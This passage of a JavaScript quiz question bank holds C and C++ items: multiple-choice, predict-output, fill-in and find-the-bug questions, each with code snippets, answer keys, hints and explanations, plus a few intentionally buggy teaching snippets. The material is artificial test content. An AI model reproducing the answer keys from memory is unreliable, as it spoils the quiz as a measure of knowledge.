    points: 300,
    estimatedSeconds: 60,
    tags: ["structs", "flexible_array"]
  },
  {
    id: "c-exp-009",
    language: "c",
    difficulty: "expert",
    type: "find_bug",
    topic: "memory",
    subtopic: "realloc_leak",
    standardVersion: "C99",
    prompt: "Identify the line with a memory leak bug where realloc failure overwrites the only pointer to the original memory block:",
    code: "#include <stdlib.h>\nint main(void) {\n    int *p = malloc(100);\n    p = realloc(p, 1000000000000ULL);\n    if (p == NULL) return 1;\n    free(p);\n    return 0;\n}",
    targetLine: 4,
    correctAnswer: 4,
    acceptedAnswers: [4, "4"],
    hint: "If realloc fails, it returns NULL while leaving the original memory block allocated.",
    explanation: "Line 4 executes `p = realloc(p, ...)`. If `realloc` fails, it returns `NULL`. Assigning `NULL` directly to `p` destroys the original pointer address, leaking the 100 bytes previously allocated on line 3.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["debugging", "memory", "realloc"]
  },
  {
    id: "c-exp-010",
    language: "c",
    difficulty: "expert",
    type: "find_bug",
    topic: "standards",
    subtopic: "signed_overflow_ub",
    standardVersion: "C99",
    prompt: "Identify the line that causes undefined behavior by deliberately overflowing a signed 32-bit integer:",
    code: "#include <stdio.h>\n#include <limits.h>\nint main(void) {\n    int x = INT_MAX;\n    int y = x + 1;\n    printf(\"%d\", y);\n    return 0;\n}",
    targetLine: 5,
    correctAnswer: 5,
    acceptedAnswers: [5, "5"],
    hint: "Unlike unsigned overflow (which wraps modulo 2^N), signed integer overflow is undefined behavior in C.",
    explanation: "Under §6.5p5 of C99, overflow of signed integer arithmetic is undefined behavior. Line 5 adds 1 to `INT_MAX`, invoking signed overflow UB, allowing compilers to assume the condition never occurs and optimize away safety checks.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["debugging", "undefined_behavior"]
  },
  {
    id: "c-exp-011",
    language: "c",
    difficulty: "expert",
    type: "fill_code",
    topic: "c11",
    subtopic: "generic_selection",
    standardVersion: "C11",
    prompt: "Fill in the C11 keyword used to implement type-generic macros based on expression types:",
    code: "#define type_str(x) ___BLANK_1___((x), \\\n    int: \"integer\", \\\n    double: \"double\", \\\n    default: \"other\")",
    blankCount: 1,
    options: ["_Generic", "_Type", "typeof", "decltype"],
    correctAnswer: "_Generic",
    acceptedAnswers: ["_Generic"],
    hint: "Introduced in C11 with an underscore and capital G.",
    explanation: "C11 introduced `_Generic` expressions (§6.5.1.1) enabling compile-time type-based dispatch without runtime overhead or external code generators.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["c11", "macros"]
  },
  {
    id: "c-exp-012",
    language: "c",
    difficulty: "expert",
    type: "fill_code",
    topic: "stdlib",
    subtopic: "qsort_comparator",
    standardVersion: "C99",
    prompt: "Complete the parameter types for a standard `qsort` comparison callback:",
    code: "#include <stdlib.h>\nint cmp(const ___BLANK_1___ *a, const void *b) {\n    return (*(int*)a - *(int*)b);\n}",
    blankCount: 1,
    options: ["void", "int", "char", "auto"],
    correctAnswer: "void",
    acceptedAnswers: ["void"],
    hint: "qsort uses generic pointers to constant memory blocks.",
    explanation: "The `qsort` comparator callback prototype is `int (*)(const void *, const void *)` to accept generic pointers to elements of any data type.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["qsort", "callbacks"]
  },
  {
    id: "c-exp-013",
    language: "c",
    difficulty: "expert",
    type: "code_tracing",
    topic: "bitwise",
    subtopic: "lowest_set_bit",
    standardVersion: "C99",
    prompt: "Trace the bitwise formula `x & (-x)` for extracting the lowest set bit of 12 (`0000 1100`):",
    code: "#include <stdio.h>\nint main(void) {\n    int x = 12;\n    int lowest = x & (-x);\n    printf(\"%d\", lowest);\n    return 0;\n}",
    options: ["4", "2", "8", "12"],
    correctAnswer: "4",
    acceptedAnswers: ["4", 4],
    hint: "In two's complement, -x = ~x + 1. 12 = 0000 1100. -12 = 1111 0100.",
    explanation: "12 is binary `0000 1100`. In two's complement, -12 is `1111 0100`. Performing bitwise AND: `0000 1100 & 1111 0100 = 0000 0100` (4), isolating the lowest set bit.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["bitwise", "twos_complement"]
  },
  {
    id: "c-exp-014",
    language: "c",
    difficulty: "expert",
    type: "predict_output",
    topic: "pointers",
    subtopic: "pointer_to_const_pointer",
    standardVersion: "C99",
    prompt: "What is the meaning of `int * const ptr = &val;`?",
    code: "int val = 10;\nint * const ptr = &val;\n*ptr = 20;",
    options: [
      "The pointer address is constant, but the integer value can be modified (*ptr = 20 is valid)",
      "Neither the pointer nor the value can be modified",
      "Only the integer value is constant",
      "Compilation error on line 3"
    ],
    correctAnswer: "The pointer address is constant, but the integer value can be modified (*ptr = 20 is valid)",
    acceptedAnswers: ["The pointer address is constant, but the integer value can be modified (*ptr = 20 is valid)"],
    hint: "`const` appears after `*`, qualifying the pointer itself rather than the integer.",
    explanation: "`int * const ptr` is a constant pointer to a mutable integer. The address stored in `ptr` cannot be changed (`ptr = &other` is illegal), but mutating the underlying integer `*ptr = 20` is valid.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["const", "pointers"]
  },
  {
    id: "c-exp-015",
    language: "c",
    difficulty: "expert",
    type: "predict_output",
    topic: "preprocessor",
    subtopic: "token_pasting",
    standardVersion: "C99",
    prompt: "What identifier is formed by the preprocessor token pasting operator `##`?",
    code: "#include <stdio.h>\n#define GLUE(a, b) a ## b\nint main(void) {\n    int val_10 = 999;\n    printf(\"%d\", GLUE(val_, 10));\n    return 0;\n}",
    options: ["999", "val_10", "\"val_10\"", "Compilation error"],
    correctAnswer: "999",
    acceptedAnswers: ["999", 999],
    hint: "The ## operator concatenates two tokens into a single combined identifier.",
    explanation: "`GLUE(val_, 10)` concatenates `val_` and `10` into the single token `val_10`. The program accesses variable `val_10`, printing 999.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["preprocessor", "macros"]
  },
  {
    id: "c-exp-016",
    language: "c",
    difficulty: "expert",
    type: "predict_output",
    topic: "c99",
    subtopic: "vla_sizeof",
    standardVersion: "C99",
    prompt: "In C99, when is `sizeof(vla)` evaluated for a Variable Length Array?",
    code: "#include <stdio.h>\nvoid test(int n) {\n    int vla[n];\n    printf(\"%zu\", sizeof(vla) / sizeof(int));\n}\nint main(void) {\n    test(7);\n    return 0;\n}",
    options: [
      "7 (evaluated dynamically at runtime)",
      "4 (evaluated at compile time)",
      "8 (evaluated as a pointer)",
      "Undefined behavior"
    ],
    correctAnswer: "7 (evaluated dynamically at runtime)",
    acceptedAnswers: ["7 (evaluated dynamically at runtime)", 7],
    hint: "Variable Length Arrays in C99 are the only case where sizeof evaluates at runtime.",
    explanation: "Under C99 §6.5.3.4p2, `sizeof` on a variable length array is not a compile-time constant; it is evaluated at runtime, yielding $7 \\times 4 / 4 = 7$.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["vla", "sizeof"]
  },
  {
    id: "c-exp-017",
    language: "c",
    difficulty: "expert",
    type: "predict_output",
    topic: "operators",
    subtopic: "comma_operator",
    standardVersion: "C99",
    prompt: "What value is produced by the comma operator in `x = (1, 2, 3)`?",
    code: "#include <stdio.h>\nint main(void) {\n    int x = (1, 2, 3);\n    printf(\"%d\", x);\n    return 0;\n}",
    options: ["3", "1", "2", "Compilation error"],
    correctAnswer: "3",
    acceptedAnswers: ["3", 3],
    hint: "The comma operator evaluates expressions left-to-right and yields the value of the rightmost operand.",
    explanation: "Under §6.5.17 of C99, the comma operator evaluates its left operand, discards the result, and returns the value of its right operand. Evaluating `(1, 2, 3)` yields 3.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["operators", "comma"]
  },
  {
    id: "c-exp-018",
    language: "c",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "standards",
    subtopic: "setjmp_longjmp",
    standardVersion: "C99",
    prompt: "What warning does ISO C mandate for local variables modified between `setjmp` and `longjmp`?",
    code: "jmp_buf env;\nint x = 0;\nif (setjmp(env) == 0) {\n    x = 10;\n    longjmp(env, 1);\n}",
    options: [
      "Non-volatile local automatic variables modified after setjmp have indeterminate values",
      "longjmp cannot be called across functions",
      "setjmp must be wrapped in a switch statement",
      "x is guaranteed to reset to its value at setjmp"
    ],
    correctAnswer: "Non-volatile local automatic variables modified after setjmp have indeterminate values",
    acceptedAnswers: ["Non-volatile local automatic variables modified after setjmp have indeterminate values"],
    hint: "Qualify local variables with volatile if their values must survive a longjmp unwinding.",
    explanation: "Under §7.13.2.1 of C99, local automatic variables that do not have `volatile` qualification and are changed between the `setjmp` invocation and `longjmp` call have indeterminate values after `longjmp` restores execution.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["setjmp", "standards"]
  },
  {
    id: "c-exp-019",
    language: "c",
    difficulty: "expert",
    type: "predict_output",
    topic: "enums",
    subtopic: "enum_sizeof",
    standardVersion: "C99",
    prompt: "What is the underlying integer type for an enum in standard C?",
    code: "#include <stdio.h>\nenum Status { OK = 0, ERR = 1 };\nint main(void) {\n    printf(\"%d\", sizeof(enum Status) == sizeof(int));\n    return 0;\n}",
    options: ["1", "0", "Compilation error", "Undefined"],
    correctAnswer: "1",
    acceptedAnswers: ["1", 1],
    hint: "In C, enumeration constants have type int.",
    explanation: "Under §6.7.2.2 of C99, enumeration constants are of type `int`. Compilers choose a compatible integer type capable of representing all values, standardly matching `sizeof(int)` (1 true).",
    points: 300,
    estimatedSeconds: 60,
    tags: ["enums", "types"]
  },
  {
    id: "c-exp-020",
    language: "c",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "linkage",
    subtopic: "inline_functions",
    standardVersion: "C99",
    prompt: "How does C99 `static inline` in a header file differ from non-static `inline`?",
    code: "static inline int max(int a, int b) { return a > b ? a : b; }",
    options: [
      "static inline provides internal linkage, giving each translation unit its own private definition",
      "static inline allocates the function pointer on the stack",
      "non-static inline forces the compiler to generate no assembly",
      "static inline disables all compiler optimization"
    ],
    correctAnswer: "static inline provides internal linkage, giving each translation unit its own private definition",
    acceptedAnswers: ["static inline provides internal linkage, giving each translation unit its own private definition"],
    hint: "The static keyword on file-scope declarations specifies internal linkage.",
    explanation: "In C99, `static inline` ensures internal linkage: if the compiler decides not to inline the function, a static private symbol is emitted locally within that translation unit, avoiding multiple definition linker errors when included across multiple `.c` files.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["linkage", "inline"]
  }
];

/* --- End of data/c-questions.js --- */

/* --- Start of data/cpp-questions.js --- */
/**
 * SyntaxArena Question Bank — C++ (C++17/C++20) (Batch 4)
 * Exactly 60 curated challenges: 20 Beginner, 20 Intermediate, 20 Expert.
 * Standard: ISO/IEC 14882:2017 (C++17) & C++20
 * Source of truth: docs/QUESTION_SCHEMA.md
 */

var cppQuestions = window.cppQuestions = [
  // =========================================================================
  // C++ BEGINNER (20 QUESTIONS: cpp-beg-001 to cpp-beg-020)
  // =========================================================================
  {
    id: "cpp-beg-001",
    language: "cpp",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "oop_basics",
    subtopic: "class_vs_struct",
    standardVersion: "C++17",
    prompt: "In C++, what is the default member access specifier for a `class` versus a `struct`?",
    code: "class MyClass { int a; };\nstruct MyStruct { int b; };",
    options: [
      "class is private by default; struct is public by default",
      "class is public by default; struct is private by default",
      "Both are private by default",
      "Both are public by default"
    ],
    correctAnswer: "class is private by default; struct is public by default",
    acceptedAnswers: ["class is private by default; struct is public by default"],
    hint: "Think about C backwards compatibility for structs compared to encapsulation for classes.",
    explanation: "In C++, the only fundamental difference between `class` and `struct` is default member and inheritance access: members of a `class` default to `private`, while members of a `struct` default to `public`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["oop", "class", "struct", "access-specifiers"]
  },
  {
    id: "cpp-beg-002",
    language: "cpp",
    difficulty: "beginner",
    type: "predict_output",
    topic: "references",
    subtopic: "lvalue_reference_modification",
    standardVersion: "C++17",
    prompt: "What is printed to stdout by this program demonstrating an lvalue reference?",
    code: "#include <iostream>\nint main() {\n    int val = 10;\n    int& ref = val;\n    ref += 15;\n    std::cout << val << \" \" << ref;\n    return 0;\n}",
    options: ["25 25", "10 25", "10 10", "25 10"],
    correctAnswer: "25 25",
    acceptedAnswers: ["25 25"],
    hint: "A reference is an alias for an existing object; modifying ref modifies val directly.",
    explanation: "In C++, `int& ref = val;` binds `ref` as an alias to `val`. Any mutation to `ref` directly mutates `val`. After `ref += 15;`, both `val` and `ref` evaluate to 25.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["references", "lvalue"]
  },
  {
    id: "cpp-beg-003",
    language: "cpp",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "pointers",
    subtopic: "nullptr_vs_null",
    standardVersion: "C++11/C++17",
    prompt: "Why is `nullptr` strongly preferred over `NULL` or `0` for null pointer representation in modern C++?",
    code: "void test(int val);\nvoid test(char* ptr);\n\ntest(nullptr);",
    options: [
      "nullptr is of type std::nullptr_t and avoids ambiguous overload resolution with integer types",
      "nullptr consumes 0 bytes of memory whereas NULL consumes 4 bytes",
      "NULL cannot be converted to void*",
      "nullptr automatically frees memory when going out of scope"
    ],
    correctAnswer: "nullptr is of type std::nullptr_t and avoids ambiguous overload resolution with integer types",
    acceptedAnswers: ["nullptr is of type std::nullptr_t and avoids ambiguous overload resolution with integer types"],
    hint: "NULL is typically defined as an integer 0 or 0L, causing issues with overloaded functions.",
    explanation: "`NULL` in C++ is a macro that expands to integral literal `0`. If a function is overloaded for both `int` and `pointer`, calling with `NULL` calls the `int` overload. `nullptr` has type `std::nullptr_t` which implicitly converts only to pointer types.",
    points: 100,
    estimatedSeconds: 35,
    tags: ["nullptr", "types", "overloading"]
  },
  {
    id: "cpp-beg-004",
    language: "cpp",
    difficulty: "beginner",
    type: "predict_output",
    topic: "stl_containers",
    subtopic: "vector_size_push_back",
    standardVersion: "C++17",
    prompt: "What is the output after executing these `std::vector` operations?",
    code: "#include <iostream>\n#include <vector>\nint main() {\n    std::vector<int> nums = {1, 2, 3};\n    nums.push_back(4);\n    nums.pop_back();\n    std::cout << nums.size() << \":\" << nums.back();\n    return 0;\n}",
    options: ["3:3", "4:4", "3:4", "4:3"],
    correctAnswer: "3:3",
    acceptedAnswers: ["3:3"],
    hint: "push_back appends an element, pop_back removes the last element.",
    explanation: "Initial size is 3 (`{1, 2, 3}`). `push_back(4)` increases size to 4 (`{1, 2, 3, 4}`). `pop_back()` removes 4, restoring size to 3 with `nums.back()` returning 3. The output is '3:3'.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["stl", "vector"]
  },
  {
    id: "cpp-beg-005",
    language: "cpp",
    difficulty: "beginner",
    type: "find_bug",
    topic: "arrays",
    subtopic: "out_of_bounds",
    standardVersion: "C++17",
    prompt: "Identify the line number with an off-by-one boundary defect accessing elements in `std::vector`.",
    code: "#include <iostream>\n#include <vector>\nint main() {\n    std::vector<int> v = {10, 20, 30};\n    for (size_t i = 0; i <= v.size(); ++i) {\n        std::cout << v[i] << \" \";\n    }\n    return 0;\n}",
    correctAnswer: 5,
    targetLine: 5,
    acceptedAnswers: [5, "5", "Line 5"],
    hint: "In C++, 0-indexed containers with size N have valid elements from index 0 through N-1.",
    explanation: "Line 5 uses `i <= v.size()`. When `i == v.size()` (here index 3 for a 3-element vector), `v[3]` accesses out of bounds, invoking undefined behavior. The condition should be `i < v.size()`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["debugging", "vector", "bounds"]
  },
  {
    id: "cpp-beg-006",
    language: "cpp",
    difficulty: "beginner",
    type: "fill_code",
    topic: "io",
    subtopic: "standard_output",
    standardVersion: "C++17",
    prompt: "Complete the statement to stream the greeting message to the standard console output.",
    code: "#include <iostream>\nint main() {\n    std::___ << \"Hello, SyntaxArena!\" << std::endl;\n    return 0;\n}",
    correctAnswer: "cout",
    acceptedAnswers: ["cout"],
    hint: "The standard character output stream in namespace std.",
    explanation: "In `<iostream>`, `std::cout` represents the standard buffered output stream. The insertion operator `<<` sends characters to `std::cout`.",
    points: 100,
    estimatedSeconds: 20,
    tags: ["io", "cout"]
  },
  {
    id: "cpp-beg-007",
    language: "cpp",
    difficulty: "beginner",
    type: "predict_output",
    topic: "loops",
    subtopic: "range_based_for",
    standardVersion: "C++17",
    prompt: "What will this range-based for loop print?",
    code: "#include <iostream>\nint main() {\n    int arr[] = {2, 4, 6};\n    int sum = 0;\n    for (int x : arr) {\n        sum += x;\n    }\n    std::cout << sum;\n    return 0;\n}",
    options: ["12", "6", "0", "14"],
    correctAnswer: "12",
    acceptedAnswers: ["12", 12],
    hint: "The range-based for loop iterates over each element in arr, adding each to sum.",
    explanation: "The range-based for loop accesses 2, 4, and 6 sequentially. `sum` becomes 0 + 2 + 4 + 6 = 12.",
    points: 100,
    estimatedSeconds: 25,
    tags: ["loops", "range-for"]
  },
  {
    id: "cpp-beg-008",
    language: "cpp",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "functions",
    subtopic: "default_arguments",
    standardVersion: "C++17",
    prompt: "Where must default arguments be placed in a C++ function parameter list?",
    code: "void compute(int a, int b = 5, int c = 10);",
    options: [
      "Trailing at the end of the parameter list",
      "Leading at the beginning of the parameter list",
      "At any arbitrary position",
      "Only in the function definition body"
    ],
    correctAnswer: "Trailing at the end of the parameter list",
    acceptedAnswers: ["Trailing at the end of the parameter list"],
    hint: "If a parameter has a default argument, all subsequent parameters must also have default arguments.",
    explanation: "According to ISO C++, all default arguments must appear trailing at the end of the parameter list because argument binding during a function call is positional left-to-right.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["functions", "default-arguments"]
  },
  {
    id: "cpp-beg-009",
    language: "cpp",
    difficulty: "beginner",
    type: "predict_output",
    topic: "functions",
    subtopic: "function_overloading",
    standardVersion: "C++17",
    prompt: "What is printed when calling these overloaded functions?",
    code: "#include <iostream>\nvoid printVal(int x) { std::cout << \"int:\"; }\nvoid printVal(double x) { std::cout << \"double:\"; }\nint main() {\n    printVal(3.14);\n    printVal(42);\n    return 0;\n}",
    options: ["double:int:", "int:double:", "double:double:", "int:int:"],
    correctAnswer: "double:int:",
    acceptedAnswers: ["double:int:"],
    hint: "3.14 is a floating-point literal of type double; 42 is an integer literal of type int.",
    explanation: "In C++, floating-point literal `3.14` has type `double`, which selects `printVal(double)`. Literal `42` has type `int`, which selects `printVal(int)`. The resulting output is 'double:int:'.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["functions", "overloading"]
  },
  {
    id: "cpp-beg-010",
    language: "cpp",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "memory",
    subtopic: "new_delete",
    standardVersion: "C++17",
    prompt: "Which deallocation operator must be used to release dynamic memory allocated with `new int[50]`?",
    code: "int* arr = new int[50];\n// ...\n___ arr;",
    options: ["delete[]", "delete", "free()", "std::destroy()"],
    correctAnswer: "delete[]",
    acceptedAnswers: ["delete[]"],
    hint: "Scalar new pairs with scalar delete; array new[] pairs with array delete[].",
    explanation: "Allocating an array via `new[]` requires using `delete[]` to release the memory and invoke destructors for each element. Mismatching `new[]` with scalar `delete` causes undefined behavior.",
    points: 100,
    estimatedSeconds: 25,
    tags: ["memory", "new", "delete"]
  },
  {
    id: "cpp-beg-011",
    language: "cpp",
    difficulty: "beginner",
    type: "predict_output",
    topic: "strings",
    subtopic: "string_concatenation",
    standardVersion: "C++17",
    prompt: "What is printed by this string concatenation snippet?",
    code: "#include <iostream>\n#include <string>\nint main() {\n    std::string s1 = \"Syntax\";\n    std::string s2 = \"Arena\";\n    std::string res = s1 + \"_\" + s2;\n    std::cout << res.length();\n    return 0;\n}",
    options: ["11", "10", "12", "6"],
    correctAnswer: "11",
    acceptedAnswers: ["11", 11],
    hint: "Count characters: 'Syntax' (6) + '_' (1) + 'Arena' (5).",
    explanation: "Concatenating 'Syntax' (length 6), '_' (length 1), and 'Arena' (length 5) produces 'Syntax_Arena' with a total length of 6 + 1 + 5 = 11 characters.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["strings", "std::string"]
  },
  {
    id: "cpp-beg-012",
    language: "cpp",
    difficulty: "beginner",
    type: "fill_code",
    topic: "namespaces",
    subtopic: "scope_resolution",
    standardVersion: "C++17",
    prompt: "Fill in the scope resolution operator used to access member symbols of a namespace or class.",
    code: "#include <iostream>\nint main() {\n    std__cout << \"Ready!\" << std__endl;\n    return 0;\n}",
    correctAnswer: "::",
    acceptedAnswers: ["::"],
    hint: "Two colons placed together represent the scope resolution operator in C++.",
    explanation: "The scope resolution operator `::` is used to qualify names declared inside namespaces or classes, such as `std::cout`.",
    points: 100,
    estimatedSeconds: 20,
    tags: ["namespaces", "syntax"]
  },
  {
    id: "cpp-beg-013",
    language: "cpp",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "constants",
    subtopic: "const_correctness",
    standardVersion: "C++17",
    prompt: "What does the `const` qualifier signify when applied to a variable definition?",
    code: "const int MAX_USERS = 100;",
    options: [
      "The variable is read-only and cannot be modified after initialization",
      "The variable is allocated in dynamic heap storage",
      "The variable must be resolved at runtime by the OS",
      "The variable can only be accessed within an inline function"
    ],
    correctAnswer: "The variable is read-only and cannot be modified after initialization",
    acceptedAnswers: ["The variable is read-only and cannot be modified after initialization"],
    hint: "Const guarantees immutability to the compiler and developer.",
    explanation: "In C++, `const` enforces immutability: attempting to assign to or alter the value of `MAX_USERS` after initialization generates a compilation error.",
    points: 100,
    estimatedSeconds: 20,
    tags: ["const", "types"]
  },
  {
    id: "cpp-beg-014",
    language: "cpp",
    difficulty: "beginner",
    type: "predict_output",
    topic: "boolean",
    subtopic: "boolalpha_output",
    standardVersion: "C++17",
    prompt: "What does this code snippet print to standard output?",
    code: "#include <iostream>\nint main() {\n    bool flag = true;\n    std::cout << flag << \" \" << std::boolalpha << flag;\n    return 0;\n}",
    options: ["1 true", "true true", "1 1", "true 1"],
    correctAnswer: "1 true",
    acceptedAnswers: ["1 true"],
    hint: "By default, booleans print as numeric 1 or 0 unless std::boolalpha stream manipulator is active.",
    explanation: "By default, stream output prints booleans numerically as `1` or `0`. Applying `std::boolalpha` switches the stream formatting to print string representations 'true' or 'false'. Hence, '1 true'.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["io", "boolalpha"]
  },
  {
    id: "cpp-beg-015",
    language: "cpp",
    difficulty: "beginner",
    type: "find_bug",
    topic: "syntax",
    subtopic: "missing_class_semicolon",
    standardVersion: "C++17",
    prompt: "Identify the line with the syntax error in this class definition.",
    code: "#include <iostream>\nclass Player {\npublic:\n    int score = 0;\n}\nint main() {\n    Player p;\n    return 0;\n}",
    correctAnswer: 5,
    targetLine: 5,
    acceptedAnswers: [5, "5", "Line 5"],
    hint: "In C++, class and struct declarations must terminate with a semicolon after the closing brace.",
    explanation: "Line 5 closes the `Player` class definition with `}` instead of `};`. In C++, struct and class declarations require a terminating semicolon after the closing curly brace.",
    points: 100,
    estimatedSeconds: 25,
    tags: ["syntax", "oop", "debugging"]
  },
  {
    id: "cpp-beg-016",
    language: "cpp",
    difficulty: "beginner",
    type: "predict_output",
    topic: "auto",
    subtopic: "auto_type_deduction",
    standardVersion: "C++17",
    prompt: "What is printed by this snippet demonstrating `auto` type deduction?",
    code: "#include <iostream>\nint main() {\n    auto x = 5;\n    auto y = 2.5;\n    std::cout << (x * y);\n    return 0;\n}",
    options: ["12.5", "12", "10", "13"],
    correctAnswer: "12.5",
    acceptedAnswers: ["12.5"],
    hint: "x is deduced as int, y is deduced as double; multiplying promotes int to double.",
    explanation: "`x` is deduced as `int` (5) and `y` as `double` (2.5). In the expression `x * y`, the int is converted to double, yielding 12.5, which is printed.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["auto", "types"]
  },
  {
    id: "cpp-beg-017",
    language: "cpp",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "headers",
    subtopic: "pragma_once",
    standardVersion: "C++17",
    prompt: "What is the primary purpose of `#pragma once` or include guards (`#ifndef` / `#define` / `#endif`) in header files?",
    code: "#pragma once\n// or\n#ifndef MY_HEADER_H\n#define MY_HEADER_H\n// ...\n#endif",
    options: [
      "To prevent duplicate inclusion of declarations within a single translation unit",
      "To speed up runtime execution of compiled binaries",
      "To ensure private variables cannot be read across threads",
      "To enable inline compilation of template definitions"
    ],
    correctAnswer: "To prevent duplicate inclusion of declarations within a single translation unit",
    acceptedAnswers: ["To prevent duplicate inclusion of declarations within a single translation unit"],
    hint: "Include guards protect against redefinition compilation errors.",
    explanation: "When headers are included directly or transitively multiple times, header guards or `#pragma once` ensure the preprocessor only processes the contents once per translation unit, preventing redefinition errors.",
    points: 100,
    estimatedSeconds: 25,
    tags: ["preprocessor", "headers"]
  },
  {
    id: "cpp-beg-018",
    language: "cpp",
    difficulty: "beginner",
    type: "predict_output",
    topic: "constructors",
    subtopic: "member_initializer_list",
    standardVersion: "C++17",
    prompt: "What is printed by this class constructor with member initializer list?",
    code: "#include <iostream>\nclass Box {\npublic:\n    int w, h;\n    Box(int width, int height) : w(width), h(height + 2) {}\n};\nint main() {\n    Box b(4, 5);\n    std::cout << b.w << \",\" << b.h;\n    return 0;\n}",
    options: ["4,7", "4,5", "6,7", "5,7"],
    correctAnswer: "4,7",
    acceptedAnswers: ["4,7"],
    hint: "w is initialized to width (4), while h is initialized to height + 2 (5 + 2).",
    explanation: "The constructor initializes `w` with 4 and `h` with `height + 2` = 7. Printing `b.w << \",\" << b.h` yields '4,7'.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["oop", "constructors"]
  },
  {
    id: "cpp-beg-019",
    language: "cpp",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "casting",
    subtopic: "static_cast",
    standardVersion: "C++17",
    prompt: "Which modern C++ named cast is designed for well-defined, compile-time conversions such as numeric conversions or upcasting?",
    code: "double pi = 3.14159;\nint truncated = static_cast<int>(pi);",
    options: ["static_cast", "reinterpret_cast", "dynamic_cast", "const_cast"],
    correctAnswer: "static_cast",
    acceptedAnswers: ["static_cast"],
    hint: "Used for static type conversions checked at compile time.",
    explanation: "`static_cast` performs standard conversions (like double to int, or enum to int) checked at compile time. `dynamic_cast` handles polymorphic runtime casting, `const_cast` removes constness, and `reinterpret_cast` reinterprets raw bit patterns.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["casting", "static_cast"]
  },
  {
    id: "cpp-beg-020",
    language: "cpp",
    difficulty: "beginner",
    type: "predict_output",
    topic: "control_flow",
    subtopic: "switch_statement",
    standardVersion: "C++17",
    prompt: "What is the output of this switch statement with deliberate fall-through?",
    code: "#include <iostream>\nint main() {\n    int opt = 2;\n    int res = 0;\n    switch (opt) {\n        case 1: res += 10;\n        case 2: res += 20;\n        case 3: res += 30;\n                break;\n        default: res += 40;\n    }\n    std::cout << res;\n    return 0;\n}",
    options: ["50", "20", "30", "90"],
    correctAnswer: "50",
    acceptedAnswers: ["50", 50],
    hint: "Case 2 matches and adds 20, but there is no break statement before case 3.",
    explanation: "Because `opt == 2`, execution starts at `case 2`, adding 20 to `res`. With no `break`, execution falls through to `case 3`, adding 30 before hitting `break`. Total `res` = 20 + 30 = 50.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["control-flow", "switch", "fallthrough"]
  },

  // =========================================================================
  // C++ INTERMEDIATE (20 QUESTIONS: cpp-int-001 to cpp-int-020)
  // =========================================================================
  {
    id: "cpp-int-001",
    language: "cpp",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "oop",
    subtopic: "virtual_functions_dynamic_dispatch",
    standardVersion: "C++17",
    prompt: "What does this program print demonstrating dynamic dispatch via virtual functions?",
    code: "#include <iostream>\nclass Base {\npublic:\n    virtual void greet() { std::cout << \"Base\"; }\n};\nclass Derived : public Base {\npublic:\n    void greet() override { std::cout << \"Derived\"; }\n};\nint main() {\n    Base* ptr = new Derived();\n    ptr->greet();\n    delete ptr;\n    return 0;\n}",
    options: ["Derived", "Base", "BaseDerived", "DerivedBase"],
    correctAnswer: "Derived",
    acceptedAnswers: ["Derived"],
    hint: "Because greet() is virtual in Base, calling it via a Base pointer resolves dynamically to the actual object type.",
    explanation: "Since `greet()` is declared `virtual` in `Base`, calls made through a `Base*` pointer pointing to a `Derived` instance are resolved dynamically at runtime using the vtable, executing `Derived::greet()`.",
    points: 200,
    estimatedSeconds: 40,
    tags: ["oop", "virtual", "polymorphism"]
  },
  {
    id: "cpp-int-002",
    language: "cpp",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "oop",
    subtopic: "rule_of_three",
    standardVersion: "C++17",
    prompt: "Under the classical C++ 'Rule of Three', if a class defines a non-trivial destructor to manage raw resources, which other two special member functions should it also implement?",
    code: "class Buffer {\n    int* data;\npublic:\n    ~Buffer() { delete[] data; }\n    // What else must be defined?\n};",
    options: [
      "Copy constructor and copy assignment operator",
      "Default constructor and move constructor",
      "operator== and operator!=",
      "std::swap and move assignment operator"
    ],
    correctAnswer: "Copy constructor and copy assignment operator",
    acceptedAnswers: ["Copy constructor and copy assignment operator"],
    hint: "If a class manages raw heap resources, default member-wise copying will cause shallow copies and double frees.",
    explanation: "The Rule of Three states that if a class requires a user-defined destructor to clean up resources, it almost certainly needs a user-defined copy constructor and copy assignment operator to avoid shallow copies and duplicate deallocations.",
    points: 200,
    estimatedSeconds: 40,
    tags: ["oop", "rule-of-three", "memory"]
  },
  {
    id: "cpp-int-003",
    language: "cpp",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "smart_pointers",
    subtopic: "unique_ptr_move",
    standardVersion: "C++17",
    prompt: "What is printed when transferring ownership of a `std::unique_ptr` using `std::move`?",
    code: "#include <iostream>\n#include <memory>\nint main() {\n    auto p1 = std::make_unique<int>(42);\n    auto p2 = std::move(p1);\n    if (!p1) {\n        std::cout << \"null:\";\n    }\n    std::cout << *p2;\n    return 0;\n}",
    options: ["null:42", "42:42", "null:null", "Compilation error"],
    correctAnswer: "null:42",
    acceptedAnswers: ["null:42"],
